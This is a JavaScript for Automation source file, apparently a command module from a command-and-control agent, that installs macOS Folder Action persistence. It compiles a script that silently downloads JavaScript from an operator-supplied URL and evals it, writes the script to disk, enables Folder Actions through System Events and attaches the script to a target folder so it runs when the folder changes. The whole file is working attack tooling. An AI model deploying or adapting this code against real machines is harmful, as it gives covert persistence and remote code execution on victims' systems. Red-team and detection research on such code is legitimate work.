exports.persist_folderaction = function(task, command, params){
    try{
    	// ======= Get params ========
    	let json_params = JSON.parse(params);
    	let folder = json_params['folder'];
    	let script_path = json_params['script_path'];
    	let url = json_params['url'];
    	let code = json_params['code'];
    	let lang = json_params['language'];
    	let code1 = "var app = Application.currentApplication();\n" +
                    "app.includeStandardAdditions = true;\n" +
                    "app.doShellScript(\" osascript -l JavaScript -e \\\"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('";
		let code2 = "')),$.NSUTF8StringEncoding)));\\\" &> /dev/null &\");";
		let output = "";
    	// ======== Compile and write script to file ==========
    	ObjC.import('OSAKit');
    	let mylang = "";
    	let myscript = "";
    	if(code !== ""){
    		mylang = $.OSALanguage.languageForName(lang);
    		myscript = $.OSAScript.alloc.initWithSourceLanguage($(code),mylang);
    	}else{
    		mylang = $.OSALanguage.languageForName("JavaScript");
    		myscript = $.OSAScript.alloc.initWithSourceLanguage($(code1 + url + code2),mylang);
    	}

		myscript.compileAndReturnError($());
		let data = myscript.compiledDataForTypeUsingStorageOptionsError("osas", 0x00000003, $());
		data.writeToFileAtomically(script_path, true);
		// ======= Handle the folder action persistence =======
        let se = Application("System Events");
		se.folderActionsEnabled = true;
		let fa_exists = false;
		let script_exists = false;
		let myScript = se.Script({name: script_path.split("/").pop(), posixPath: script_path});
		let fa = se.FolderAction({name: folder.split("/").pop(), path: folder});
		// first check to see if there's a folder action for the path we're looking at
		for(let i = 0; i < se.folderActions.length; i++){
			if(se.folderActions[i].path() === folder){
				// if our folder already has folder actions, just take the reference for later
				fa = se.folderActions[i];
				fa_exists = true;
				output += "Folder already has folder actions\n";
				break;
			}
		}
		// if the folder action doesn't exist, add it
		if(fa_exists === false){
			se.folderActions.push(fa);
		}
		// Check to see if this script already exists on this folder
		for(let i = 0; i < fa.scripts.length; i++){
			if(fa.scripts[i].posixPath() ===  script_path){
				script_exists = true;
				output += "Script already assigned to this folder\n";
				break;
			}
		}
		if(script_exists === false){
			fa.scripts.push(myScript);
		}
		output += "Folder Action established";
		return {"user_output":output, "completed": true, "artifacts": [{"base_artifact":"File Create", "artifact": script_path}]};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};
